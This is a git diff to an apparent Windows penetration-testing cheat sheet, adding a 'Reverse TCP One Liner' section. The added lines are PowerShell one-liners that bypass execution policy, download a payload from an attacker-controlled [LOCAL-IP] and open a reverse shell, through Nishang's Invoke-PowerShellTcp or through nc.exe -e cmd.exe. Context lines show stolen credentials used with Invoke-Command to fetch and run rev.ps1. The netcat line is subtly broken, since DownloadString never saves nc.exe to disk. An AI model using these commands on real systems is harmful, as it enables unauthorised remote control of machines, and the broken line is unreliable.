@@ -25,6 +25,7 @@ Table of Contents
       * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
       * [Changing <em>ExecutionPolicy</em> to Bypass](#changing-executionpolicy-to-bypass)
       * [Executing commands as another user](#executing-commands-as-another-user)
+      * [Reverse TCP One Liner](#reverse-tcp-one-liner)
    * [PrivEsc on Windows](#privesc-on-windows)
       * [Bypassing Windows Defender](#bypassing-windows-defender)
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
@@ -134,6 +135,21 @@ Have we obtained a shell from your objective and got any credentials we can use 
 $password = ConvertTo-SecureString '__PasswordObtained__' -Asplain -Force
 $credential = New-Object System.Management.Automation.PSCredential('__Domain__\__User__', $password)
 Invoke-Command -Computer __Hostname__ -Credential $credential -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/rev.ps1') }
+```
+
+## Reverse TCP One Liner
+The following commands achieve remote command execution trough reverse tcp in a simple way, just deploy a web server with your prefered way and execute it on the targeted machine:
+
+### PowerShell Reverse TCP using Nishang
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object Net.WebClient).DownloadString('http://[LOCAL-IP]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [LOCAL-IP] -Port [PORT]
+```
+
+### Simple Reverse TCP using NetCat
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object Net.WebClient).DownloadString('http://[LOCAL-IP]/nc.exe');nc.exe -e cmd.exe [LOCAL-IP] [PORT]
 ```
 
 # PrivEsc on Windows
